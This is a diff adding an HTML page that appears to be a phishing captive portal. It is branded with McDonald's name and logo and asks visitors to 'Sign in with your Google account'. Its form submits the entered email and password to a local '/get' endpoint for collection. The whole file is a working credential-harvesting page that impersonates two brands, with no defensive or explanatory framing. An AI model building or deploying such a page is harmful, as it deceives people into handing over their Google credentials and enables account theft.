@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FFC72C;
+  margin-right: 100px
+}
+
+.mcdonalds-name {
+  font-size: 42px;
+  color: #FFC72C;
+  margin-left: 10px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #FFC72C;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #27742d;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #FFC72C;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #27742d;
+  border: none;
+  color: #FFC72C;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #FFC72C;
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+   <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="65.000000pt" height="65.000000pt" viewBox="0 0 1196.000000 1192.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1192.000000) scale(0.100000,-0.100000)"
+fill="#27742d" stroke="none">
+<path d="M0 5960 l0 -5960 5980 0 5980 0 0 5960 0 5960 -5980 0 -5980 0 0
+-5960z m4579 3189 c299 -76 582 -340 858 -799 194 -323 383 -782 544 -1320
+l22 -75 20 65 c265 848 503 1345 822 1718 227 266 449 403 703 432 283 33 547
+-101 818 -416 356 -414 686 -1180 915 -2124 70 -288 74 -304 113 -500 186
+-924 295 -1986 313 -3062 l6 -378 -456 0 c-252 0 -460 -1 -464 -2 -5 -2 -9 74
+-10 167 -20 1665 -141 3079 -353 4148 -195 979 -434 1550 -703 1682 -49 24
+-66 27 -115 22 -422 -38 -787 -1087 -997 -2862 -85 -725 -144 -1728 -145
+-2467 l0 -228 -464 0 -464 0 -6 373 c-22 1215 -102 2204 -251 3098 -195 1164
+-467 1884 -776 2054 -45 25 -65 30 -124 30 -59 0 -79 -5 -123 -30 -477 -263
+-875 -2046 -997 -4465 -16 -311 -35 -971 -38 -1308 l-2 -212 -464 -3 -464 -2
+6 400 c11 688 53 1293 137 1960 227 1808 702 3208 1294 3809 273 277 543 372
+845 295z m5705 -6027 c70 -39 109 -97 114 -172 6 -83 -3 -121 -42 -171 -68
+-90 -186 -116 -290 -65 -84 41 -126 110 -126 206 0 65 17 108 59 154 75 81
+192 100 285 48z"/>
+<path d="M10100 3103 c-121 -46 -155 -233 -60 -324 76 -73 183 -73 259 -1 88
+84 76 234 -25 304 -32 23 -50 27 -99 27 -33 0 -67 -3 -75 -6z m140 -61 c30
+-15 35 -22 38 -58 3 -36 -1 -45 -28 -67 l-30 -26 30 -47 c35 -56 37 -64 11
+-64 -12 0 -33 21 -57 60 -28 44 -44 60 -58 58 -16 -3 -19 -12 -20 -58 -1 -49
+-3 -55 -23 -58 -23 -3 -23 -3 -23 137 l0 141 63 0 c39 0 75 -6 97 -18z"/>
+</g>
+</svg>
+
+
+    <div class="mcdonalds-name">McDonald's</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your Google account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+      <button class="submit-btn" type="submit">Continue</button>
+
+    </form>
+
+  </div>
+
+</div>
+
+</body>
+</html>
